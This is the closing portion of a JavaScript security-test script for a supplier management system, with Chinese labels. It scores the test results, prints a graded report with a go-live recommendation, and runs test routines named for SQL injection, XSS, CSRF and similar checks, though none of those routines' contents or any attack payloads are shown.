  score -= warningCount * 2;    // 警告 -2 分
  score = Math.max(0, score);

  let rating = '';
  let color = 'green';
  if (score >= 90) {
    rating = 'A（优秀）';
    color = 'green';
  } else if (score >= 80) {
    rating = 'B（良好）';
    color = 'green';
  } else if (score >= 70) {
    rating = 'C（合格）';
    color = 'yellow';
  } else if (score >= 60) {
    rating = 'D（需改进）';
    color = 'yellow';
  } else {
    rating = 'F（不合格）';
    color = 'red';
  }

  log(`  总分: ${score}/100`, color);
  log(`  评级: ${rating}`, color);
  log(`  通过测试: ${passedCount} 项`, 'green');
  log(`  安全警告: ${warningCount} 项`, 'yellow');
  log(`  发现漏洞: ${vulnCount} 项`, 'red');
  log(`  严重问题: ${criticalCount} 项`, 'red');

  console.log('\n');
  log('【上线建议】', 'cyan');

  if (criticalCount > 0) {
    log('  ✗ 不建议上线！必须先修复严重安全问题', 'red');
  } else if (vulnCount > 0) {
    log('  ⚠ 建议修复安全漏洞后再上线', 'yellow');
  } else if (warningCount > 5) {
    log('  ⚠ 建议处理部分安全警告后上线', 'yellow');
  } else {
    log('  ✓ 安全测试通过，可以上线', 'green');
  }

  console.log('\n' + '='.repeat(70));
}

// ============================================================================
// 主测试流程
// ============================================================================
async function runAllTests() {
  log('\n供应商管理系统 - 高级安全测试', 'cyan');
  log('开始时间: ' + new Date().toLocaleString('zh-CN'), 'blue');
  log('测试环境: ' + API_BASE, 'blue');

  try {
    await testSQLInjection();
    await testXSS();
    await testCSRF();
    await testAuthorizationBoundaries();
    await testDataEncryption();
    await testSessionManagement();
    await testFileUploadSecurity();
    await testInformationDisclosure();

    generateReport();
  } catch (error) {
    log(`\n测试过程出现错误: ${error.message}`, 'red');
    console.error(error);
  }

  log('\n结束时间: ' + new Date().toLocaleString('zh-CN'), 'blue');
}

// 运行测试
runAllTests().catch(console.error);
